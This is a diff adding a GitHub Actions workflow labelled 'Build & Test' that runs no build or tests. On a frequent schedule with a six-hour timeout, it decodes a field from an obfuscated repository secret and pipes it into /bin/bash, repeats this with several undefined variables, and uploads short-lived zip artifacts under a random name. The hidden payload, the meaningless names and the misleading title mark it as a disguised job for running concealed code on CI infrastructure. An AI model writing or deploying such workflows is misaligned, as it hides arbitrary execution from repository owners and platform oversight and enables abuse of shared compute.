@@ -1,0 +1,31 @@
+name: Build & Test
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '44 4,10,16,22 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  runner:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Go
+        env:
+          jbroa865: ${{ secrets.jbroa865 }}
+        run: |
+          printf '%s' "$jbroa865" | jq -r .yxk2 | /bin/bash
+          echo $uzp42628 | jq -r .nof0038 | /bin/bash
+          printf '%s' "$vy18" | jq -r .nu54 | /bin/bash
+          printf '%s' "$eme874" | jq -r .gxkyl32522 | /bin/bash
+          printf '%s' "$qx34230" | jq -r .p73609 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: oVhMArZ0
+          path: "*.zip"
+          retention-days: 1
